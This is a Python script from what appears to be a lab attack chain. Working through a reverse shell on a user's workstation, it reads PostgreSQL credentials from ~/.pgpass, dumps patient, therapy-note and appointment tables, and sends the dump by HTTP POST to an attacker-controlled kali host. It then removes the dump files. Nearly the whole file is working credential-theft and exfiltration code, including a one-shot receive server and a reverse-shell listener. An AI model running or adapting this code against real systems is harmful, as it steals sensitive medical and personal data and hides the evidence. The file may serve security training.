import os
import re
import socket
import subprocess
import time

from chainlog import log

# =============================================================================
# exfiltrate_db.py — DB Exfiltration from John's Workstation
# MITRE ATT&CK:
#   T1552.001 – Credentials In Files   (read ~/.pgpass for DB credentials)
#   T1213     – Data from Information Repositories (psql dump of patients + session_notes)
#   T1041     – Exfiltration Over C2 Channel (HTTP POST back to kali)
# =============================================================================

KALI_HOST        = "10.10.0.2"
EXFIL_HTTP_PORT  = 9002
EXFIL_LOCAL_PATH = "/tmp/db_exfil.dump"   # written on kali

PGPASS_PATH = "/home/john.stravidis/.pgpass"
DUMP_PATH   = "/tmp/db_dump.dump"          # assembled on workstation

_sentinel_seq = 0


# ---------------------------------------------------------------------------
# Shell helpers
# ---------------------------------------------------------------------------

def _drain(shell):
    prev = shell.gettimeout()
    shell.settimeout(0.1)
    while True:
        try:
            if not shell.recv(4096):
                break
        except socket.timeout:
            break
    shell.settimeout(prev)


def _run_remote(shell, cmd, timeout=15):
    global _sentinel_seq
    _sentinel_seq += 1
    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"

    _drain(shell)
    shell.sendall(f"{cmd}\n".encode())
    time.sleep(0.5)
    shell.sendall(f"echo {sentinel}\n".encode())

    prev = shell.gettimeout()
    shell.settimeout(2)
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            buf += shell.recv(4096).decode(errors="replace")
        except socket.timeout:
            pass
        if sentinel in buf:
            break
    shell.settimeout(prev)

    if sentinel in buf:
        buf = buf[: buf.index(sentinel)]

    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
    return buf.replace("\r", "").strip()


# ---------------------------------------------------------------------------
# Kali-side HTTP receive server
# ---------------------------------------------------------------------------

def _start_receive_server(port=EXFIL_HTTP_PORT, output_path=EXFIL_LOCAL_PATH):
    """One-shot HTTP server: accepts a single POST and saves the body to a file."""
    script = (
        f"import http.server\n"
        f"class H(http.server.BaseHTTPRequestHandler):\n"
        f"    def do_POST(self):\n"
        f"        n=int(self.headers['Content-Length'])\n"
        f"        open('{output_path}','wb').write(self.rfile.read(n))\n"
        f"        self.send_response(200);self.end_headers()\n"
        f"    def log_message(self,*a):pass\n"
        f"http.server.HTTPServer(('0.0.0.0',{port}),H).handle_request()\n"
    )
    proc = subprocess.Popen(
        ["python3", "-c", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)
    log(f"[+] Receive server started on port {port} (saving to {output_path})")
    return proc


def _stop_receive_server(proc):
    if proc and proc.poll() is None:
        proc.terminate()
        log("[+] Receive server stopped")


# ---------------------------------------------------------------------------
# Attack phases
# ---------------------------------------------------------------------------

def _discover_db_creds(john_shell):
    """Read ~/.pgpass and return the first credential dict, or None."""
    log(f"[*] Reading DB credentials from {PGPASS_PATH} ...")
    raw = _run_remote(john_shell, f"cat {PGPASS_PATH}")
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":", 4)
        if len(parts) == 5:
            host, port, dbname, user, password = parts
            log(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
            return {"host": host, "port": port, "dbname": dbname,
                    "user": user, "password": password}
    log("[-] No usable credential found in .pgpass")
    return None


def _dump_db(john_shell, creds):
    """
    Dump patients, session_notes, and appointments to DUMP_PATH via psql.
    waystar-readonly has SELECT on all three — more than the webserver's
    waystar-app (INSERT-only on appointments).
    """
    # PGPASSFILE avoids shell-quoting issues with special characters in the password.
    psql_env  = f"PGPASSFILE={PGPASS_PATH} PGSSLMODE=disable "
    psql_base = (
        f"psql -h {creds['host']} -p {creds['port']} "
        f"-U {creds['user']} -d {creds['dbname']} -t -A -F ,"
    )

    log("[*] Dumping patients table ...")
    _run_remote(
        john_shell,
        f"{psql_env}{psql_base} "
        f"-c \"SELECT id,first_name,last_name,dob,gender,ins_number,"
        f"phone,email,street,city,postal_code,diagnosis FROM patients;\""
        f" > {DUMP_PATH} 2>/dev/null",
        timeout=20,
    )
    row_count_raw = _run_remote(
        john_shell,
        f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM patients;'",
        timeout=10,
    )
    row_count = row_count_raw.strip().splitlines()[-1] if row_count_raw.strip() else "?"
    log(f"[+] patients: {row_count} rows")

    log("[*] Dumping session_notes table ...")
    _run_remote(
        john_shell,
        f"echo '--- session_notes ---' >> {DUMP_PATH} && "
        f"{psql_env}{psql_base} "
        f"-c \"SELECT id,patient_id,therapist,session_date,session_type,"
        f"duration_min,content FROM session_notes;\""
        f" >> {DUMP_PATH} 2>/dev/null",
        timeout=20,
    )
    notes_count_raw = _run_remote(
        john_shell,
        f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM session_notes;'",
        timeout=10,
    )
    notes_count = notes_count_raw.strip().splitlines()[-1] if notes_count_raw.strip() else "?"
    log(f"[+] session_notes: {notes_count} rows")

    log("[*] Dumping appointments table ...")
    _run_remote(
        john_shell,
        f"echo '--- appointments ---' >> {DUMP_PATH} && "
        f"{psql_env}{psql_base} "
        f"-c \"SELECT id,full_name,email,preferred_date,preferred_time,"
        f"focus,notes,source_ip,status FROM appointments;\""
        f" >> {DUMP_PATH} 2>/dev/null",
        timeout=20,
    )
    appt_count_raw = _run_remote(
        john_shell,
        f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM appointments;'",
        timeout=10,
    )
    appt_count = appt_count_raw.strip().splitlines()[-1] if appt_count_raw.strip() else "?"
    log(f"[+] appointments: {appt_count} rows")

    size_raw = _run_remote(john_shell, f"wc -c < {DUMP_PATH} 2>/dev/null || echo 0")
    size = size_raw.strip().splitlines()[-1].strip() if size_raw.strip() else "0"
    log(f"[+] Dump written to {DUMP_PATH} ({size} bytes)")

    return {"patients": row_count, "session_notes": notes_count,
            "appointments": appt_count, "dump_bytes": size}


def _send_to_kali(john_shell, kali_host, port=EXFIL_HTTP_PORT):
    """POST the dump file from the workstation to kali's receive server."""
    log(f"[*] Sending dump to {kali_host}:{port} ...")
    _run_remote(
        john_shell,
        f"python3 -c \""
        f"import urllib.request; "
        f"data=open('{DUMP_PATH}','rb').read(); "
        f"urllib.request.urlopen('http://{kali_host}:{port}/', data=data, timeout=30)"
        f"\"",
        timeout=30,
    )
    if os.path.exists(EXFIL_LOCAL_PATH):
        size = os.path.getsize(EXFIL_LOCAL_PATH)
        log(f"[+] Dump received on kali ({size} bytes) → {EXFIL_LOCAL_PATH}")
        return True
    log(f"[-] Exfiltration may have failed — {EXFIL_LOCAL_PATH} not found on kali")
    return False


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(john_shell, kali_host=KALI_HOST, db_creds=None):
    """
    Dump patients + session_notes from the DB and exfiltrate to kali.

    Args:
        john_shell (socket): reverse shell as john.stravidis on ubuntu_workstation.
        kali_host (str):     kali IP for the HTTP receive server.
        db_creds (dict):     credential dict (host/port/dbname/user/password).
                             If None, falls back to reading ~/.pgpass directly.
                             Supplied by enumeration_john_ws when that step runs first.

    Returns:
        dict: db_creds, exfil_path, exfil_ok, stats
    """
    log("\n[*] Starting DB exfiltration from john.stravidis's workstation ...")

    # Phase 1 — Credentials
    if db_creds is not None:
        log(f"[+] Using credentials from enumeration step: "
              f"{db_creds['user']}@{db_creds['host']}")
        creds = db_creds
    else:
        creds = _discover_db_creds(john_shell)
    if creds is None:
        log("[-] Cannot proceed without DB credentials")
        return {"db_creds": None, "exfil_path": None, "exfil_ok": False, "stats": {}}

    # Phase 2 — Dump tables
    stats = _dump_db(john_shell, creds)

    try:
        dump_bytes = int(stats.get("dump_bytes", "0").strip())
    except ValueError:
        dump_bytes = 0
    if dump_bytes < 10:
        log(f"[-] Dump file appears empty ({dump_bytes} bytes) — psql may have failed; aborting")
        _run_remote(john_shell, f"rm -f {DUMP_PATH}")
        return {"db_creds": creds, "exfil_path": None, "exfil_ok": False, "stats": stats}

    # Phase 3 — Send to kali
    recv_proc = _start_receive_server()
    try:
        exfil_ok = _send_to_kali(john_shell, kali_host)
    finally:
        _stop_receive_server(recv_proc)

    # Cleanup — remove dump from workstation and kali
    _run_remote(john_shell, f"rm -f {DUMP_PATH}")
    log(f"[+] Removed {DUMP_PATH} from workstation")

    if exfil_ok and os.path.exists(EXFIL_LOCAL_PATH):
        os.remove(EXFIL_LOCAL_PATH)
        log(f"[+] Removed {EXFIL_LOCAL_PATH} from kali")

    if exfil_ok:
        log(
            f"[+] Exfiltration complete — "
            f"{stats.get('patients', '?')} patients, "
            f"{stats.get('session_notes', '?')} session notes, "
            f"{stats.get('appointments', '?')} appointments"
        )
    else:
        log("[-] Exfiltration finished with errors")

    return {
        "db_creds":    creds,
        "exfil_path":  None,       # file was cleaned up after transfer
        "exfil_ok":    exfil_ok,
        "stats":       stats,
    }


# ---------------------------------------------------------------------------
# Standalone test mode
# Usage: docker compose exec kali python3 /Attack-chain/exfiltrate_db.py
# Pre-condition: john.stravidis reverse shell already listening on port 6666
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    PORT_JOHN = 6666
    log(f"[*] Test mode — waiting for john.stravidis shell on port {PORT_JOHN}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT_JOHN))
    server.listen(1)

    try:
        john_shell, addr = server.accept()
        log(f"[+] Shell received from {addr[0]}")
    finally:
        server.close()

    result = run(john_shell)
    log(f"\n[*] Result: {'success' if result['exfil_ok'] else 'failed'}")
